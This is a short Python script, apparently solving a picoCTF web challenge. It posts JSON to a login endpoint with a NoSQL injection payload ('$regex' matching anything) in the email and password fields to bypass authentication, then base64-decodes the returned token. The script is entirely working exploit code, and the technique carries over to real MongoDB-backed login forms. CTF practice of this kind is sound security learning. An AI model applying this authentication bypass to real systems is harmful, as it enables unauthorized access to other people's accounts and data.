import requests
import base64

url = "http://atlas.picoctf.net:55510"


res = requests.post(f'{url}/login', json={
    'email': '{"$regex": ".*"}', 
    "password": '{"$regex": ".*"}',
})

token = res.json()['token']

print(base64.b64decode(token).decode())